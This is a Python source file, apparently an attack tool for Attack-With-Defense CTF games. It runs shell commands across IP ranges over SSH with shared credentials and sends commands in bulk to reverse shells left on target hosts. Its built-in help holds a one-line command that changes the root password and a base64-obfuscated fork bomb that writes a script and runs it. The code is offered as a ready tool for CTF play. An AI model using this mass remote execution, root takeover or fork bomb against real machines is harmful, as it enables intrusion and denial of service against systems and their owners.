#!/usr/bin/python
# -*- coding: UTF-8 -*-
__author__ = "HeliantHuS"
__version__ = "1.0"
"""
@ Author: HeliantHuS
@ Codes are far away from bugs with the animal protecting
@ Time:  9/28/2019
@ FileName: AWD-Tools.py
"""

import socket
import sys
import threading
import warnings

try:
    import paramiko
except ImportError:
    print("你没有安装paramiko, 使用`pip install paramiko`安装完再运行我吧~")
    input("Enter Any Key as Exit")
    exit()

warnings.filterwarnings(action='ignore', module='.*paramiko.*')

hosts = ""
username = ""
password = ""
shells = []
banner = """
 _   _      _ _             _   _   _       ____  
| | | | ___| (_) __ _ _ __ | |_| | | |_   _/ ___| 
| |_| |/ _ \ | |/ _` | '_ \| __| |_| | | | \___ \ 
|  _  |  __/ | | (_| | | | | |_|  _  | |_| |___) |
|_| |_|\___|_|_|\__,_|_| |_|\__|_| |_|\__,_|____/   --- AWD-Tools
                                                     
"""
print(banner)

# connect ssh连接并执行一条命令
def connect(host: str, username: str, password: str, port: int, command: str):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, port=port, username=username, password=password, timeout=3)
        stdin, stdout, stderr = client.exec_command(command)
        print(f"[+]由{host}返回的消息:")
        for i in stdout.readlines():
            print(i.strip())

    except socket.timeout as e:
        print(f"[-]{host}已离线.")

    except paramiko.ssh_exception.AuthenticationException as e:
        print(f"[-]{host}验证失败.")

    finally:
        client.close()


# lconnect ssh连接连续执行多条命令
def lconnect(host: str, username: str, password: str, port: int, commands: list):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, port=port, username=username, password=password, timeout=3)
        print(f"[+]由{host}返回的消息:")
        for command in commands:
            stdin, stdout, stderr = client.exec_command(command)
            for i in stdout.readlines():
                print(i.strip())

    except socket.timeout as e:
        print(f"[-]{host}已离线.")

    except paramiko.ssh_exception.AuthenticationException as e:
        print(f"[-]{host}登录失败.")

    finally:
        client.close()


# netCat 目标机器存在反射shell即可使用
def netCat(host: str, port: int, command: str, bytesNum=1024):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(command.encode() + b"\n")
        print(f"[+]{host}响应为:")
        print(s.recv(bytesNum).decode())
    except TimeoutError:
        print(f"[-]{host}连接超时.")
    except:
        print(f"[-]{host}未知错误.")
    finally:
        s.close()

# splitIPaddress 按照格式生成单个ip
def splitIPaddress(ip: str):
    if len(ip.split("-")) <= 1:
        return ip.split("-")
    ipResource = ".".join(ip.split("-")[0].split(".")[0:3])  # 取a.b.c
    ipStart = ip.split("-")[0].split(".")[3]  # 取d的结束
    ipEnd = ip.split("-")[1]  # 取d的开始
    return [f"{ipResource}.{i}" for i in range(int(ipStart), int(ipEnd) + 1)]


# multiConnect 批量ssh
def multiConnect(hosts: str, username: str, password: str, command: str, multi: bool, port=22):
    if multi == True:
        for i in splitIPaddress(hosts):
            t = threading.Thread(target=lconnect, args=(i, username, password, port, command,))
            t.setDaemon(True)
            t.start()
        t.join()

    elif multi == False:
        for i in splitIPaddress(hosts):
            t = threading.Thread(target=connect, args=(i, username, password, port, command,))
            t.setDaemon(True)
            t.start()
        t.join()

# multiNetCat 批量nc
def multiNetCat(hosts: str, port: int, command: str, bytesNum=1024):
    for i in splitIPaddress(hosts):
        t = threading.Thread(target=netCat, args=(i, port, command, bytesNum,))
        t.setDaemon(True)
        t.start()
    t.join()


# CLI 用户交互
def CLI():
    while True:
        print("""
                提示: 多个ip批量处理请输入 "192.168.1.100-150" 单个ip "192.168.1.100"
                选择功能:
                    [1]. 批量执行单条shell命令
                    [2]. 批量执行多条shell命令
                    [3]. 批量nc
                    [4]. 提示
                    [5]. 退出
            """)
        global hosts
        global username
        global password
        global shells

        choose1 = input("[Choose] >>> ")
        if choose1 in ["1", "2", "3", "4", "5"]:
            if choose1 == "1":
                hosts = input("hosts >>> ")
                # 单
                if username == "" and password == "":
                    username = input("username >>> ")
                    password = input("password >>> ")
                else:
                    print("检测到已经输入过用户名和密码了, 已帮你自动填写.")

                shell = input("shell(默认cat /flag) >>> ")

                if shell != "":
                    multiConnect(hosts=hosts, username=username, password=password, command=shell, multi=False)
                else:
                    multiConnect(hosts=hosts, username=username, password=password, command="cat /flag", multi=False)

            elif choose1 == "2":
                hosts = input("hosts >>> ")
                # 多
                if username == "" and password == "":
                    username = input("username >>> ")
                    password = input("password >>> ")
                else:
                    print("检测到已经输入过用户名和密码了, 已帮你自动填写.")


                # 循环输入要执行的命令
                temp = 0
                while True:
                    shell = input(f" [{temp + 1}]>>> ")
                    if shell == "":
                        break
                    else:
                        shells.append(shell)
                    temp += 1

                multiConnect(hosts=hosts, username=username, password=password, command=shells, multi=True)
            elif choose1 == "3":
                hosts = input("hosts >>> ")
                port = input("port >>> ")
                shell = input("shell >>> ")
                recvNum = input("recvNum(默认1024) >>>")
                if recvNum == "":
                    multiNetCat(hosts=hosts, port=int(port), command=shell)
                else:
                    multiNetCat(hosts=hosts, port=int(port), command=shell, bytesNum=int(recvNum))


            elif choose1 == "4":
                help()

            elif choose1 == "5":
                exit()

        else:
            print("你的输入有误.")


# help 帮助
def help():
    print(f"""
    {"*" * 10}备忘录{"*" * 10}
    1. 一条命令修改root密码: 'echo helianthusAwesome | passwd --stdin root'
    2. Fork炸弹: 'echo -n "OigpIHsgOnw6JiB9Ozo=" | base64 -d > ~/fork.sh && chmod +x ~/fork.sh && bash ~/fork.sh'
    """)

if __name__ == '__main__':
    if "help" in sys.argv:
        help()
    CLI()
    input("Enter any Key as Exit!")
